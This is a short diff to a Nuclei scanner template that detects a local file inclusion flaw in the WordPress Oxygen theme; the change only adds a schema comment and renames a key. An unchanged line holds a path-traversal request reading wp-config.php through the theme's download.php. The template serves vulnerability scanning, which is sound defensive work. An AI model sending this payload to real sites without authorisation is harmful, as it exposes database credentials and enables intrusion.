@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: wp-oxygen-theme-lfi
 info:
   name: WordPress Oxygen-Theme - Local File Inclusion
@@ -11,7 +12,7 @@ info:
     cvss-score: 7.5
     cwe-id: CWE-22
   tags: wordpress,wp-theme,lfi
-requests:
+http:
   - method: GET
     path:
       - '{{BaseURL}}/wp-content/themes/oxygen-theme/download.php?file=../../../wp-config.php'
